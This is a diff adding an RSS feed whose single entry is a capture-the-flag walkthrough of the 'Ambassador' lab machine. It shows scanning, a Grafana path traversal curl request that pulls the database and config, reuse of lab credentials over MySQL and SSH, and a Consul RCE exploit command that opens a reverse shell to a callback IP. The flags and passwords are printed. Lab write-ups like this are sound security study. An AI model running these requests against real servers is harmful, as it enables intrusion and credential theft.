@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+    <channel>
+        <title></title>
+        <link>undefined</link>
+        <description>undefined</description>
+        <lastBuildDate>Tue, 28 Feb 2023 17:52:54 GMT</lastBuildDate>
+        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
+        <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Ambassador redux]]></title>
+            <guid>aa7840ad61a7424ba3d9a32bbbec24d7</guid>
+            <pubDate>Mon, 27 Feb 2023 16:30:30 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We start with a scan:<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.183<br />
+<img src="/_resources/08d8aef179a1475daa974d96a20b06f0.png" /><br />
+<img src="/_resources/9fe0393786464cc4b6eb34c3a47e7cac.png" /></p>
+<p>We run a full scan in the background:<br />
+nmap -sC -sV -p- -oA nmap/full 10.10.11.183<br />
+<img src="/_resources/a62f834124e249bbaac6532665ee0dd9.png" /><br />
+<img src="/_resources/b07d4a9b07204bc3911c652910e9249b.png" /></p>
+<p>We see a site on port 80:<br />
+<img src="/_resources/252fbac64a14453891ed342ccc0d2f4d.png" /></p>
+<p>There appears to be a second webserver on port 3000 and mysql running on port 3306</p>
+<p>The site on port 3000 directs us a login portal:<br />
+<img src="/_resources/e587e6a0bec74634bdfaf91a3729746a.png" /></p>
+<p>The portal is run using Grafana v8.2.0<br />
+<img src="/_resources/6ce9332a292a41ceb0a827e88173500e.png" /></p>
+<p>There is a vulnerability in Grafana 8.3.0 so it's likely that will work for this version, too.<br />
+<img src="/_resources/c7dd52974faa4022933872297396572e.png" /></p>
+<p>We run the exploit and find that it works:<br />
+<img src="/_resources/3a2c7ab255df457d8c95b4e00a4cbc56.png" /></p>
+<p>We can read files now.<br />
+Using documentation (on site, to find /etc/grafna/grafna.ini):<br />
+<img src="/_resources/024ad4556941499a849828ea7ec7402e.png" /><br />
+<img src="/_resources/214649044c2445e6ae636070e105c138.png" /><br />
+<img src="/_resources/81fdf74c90694ca6a74065d54c5807ad.png" /><br />
+found admin credentials for grafana<br />
+<img src="/_resources/7140bfdfede144b4bdba6030391208c9.png" /><br />
+messageInABottle685427</p>
+<p>We use curl to download the databse, with the help of the directory traversal expoit:<br />
+curl --path-as-is <a title="http://10.10.11.183:3000/public/plugins/../../../../../../../../../../../../../var/lib/grafana/grafana.db" href="http://10.10.11.183:3000/public/plugins/../../../../../../../../../../../../../var/lib/grafana/grafana.db">http://10.10.11.183:3000/public/plugins/../../../../../../../../../../../../../var/lib/grafana/grafana.db</a> -o grafana.db</p>
+<p><img src="/_resources/1bcf76ba373547c78ddc1af93873cb29.png" /></p>
+<p>used sqlitebrowser to search for user info<br />
+<img src="/_resources/e662f5ca66074664ab5b7757580abf87.png" /><br />
+dontStandSoCloseToMe63221!</p>
+<p>log into mysql remotely:<br />
+mysql -u grafana -p -h 10.10.11.183 -P 3306<br />
+<img src="/_resources/e49c55abc3e144c68637811e5cb49b9f.png" /></p>
+<p>enumerated users from whackywidget database, and found a base64 encoded password:<br />
+<img src="/_resources/7a4d106ef22e41f387a9c03494911a46.png" /><br />
+YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==<br />
+anEnglishManInNewYork027468</p>
+<p>We can now try logging in via ssh:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" developer@ambassador.htb<br />
+<img src="/_resources/5d6ad37bc2f64e0f9e89696ba84f9ced.png" /></p>
+<p>We get the user.txt:<br />
+<img src="/_resources/f2f7dfe60aca46ff89ef034e9e78afbf.png" /></p>
+<p>eventually, linpeas reveals /opt/my-app/.git which has logs that can be viewed<br />
+<img src="/_resources/972d2eed00f84eebb0a8a79aee246a15.png" /><br />
+<img src="/_resources/3c0382291cdd47e482a31399707e219c.png" /></p>
+<p><img src="/_resources/b4db8d3fc6554e56bac931a8a15f48a3.png" /><br />
+we find a token for a service called consul.<br />
+<img src="/_resources/64929a148c30498196ba27194e512076.png" /><br />
+that is the service running on 8500, but we cannot log into it.</p>
+<p>Searchsploit reveals metsploit modules for consul with RCE.<br />
+We look on github and find an exploit for this:<br />
+<a title="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API" href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API">https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API</a></p>
+<p>We can upload the exploit the the ambassador machine and the run it with the API token we found in the github pulls:</p>
+<p>python3 exploit.py 127.0.0.1 8500 10.10.14.6 1337 -tk bb03b43b-1d81-d62b-24b5-39540ee469b5</p>
+<p>We get a reverse shell, and then get the root.txt:<br />
+<img src="/_resources/b96e87c34bf94d8fa9e35d5aaf7ae265.png" /><br />
+bf4b047415fd875ff672ddddcaa3cebd</p>
+]]></content:encoded>
+        </item>
+    </channel>
+</rss>
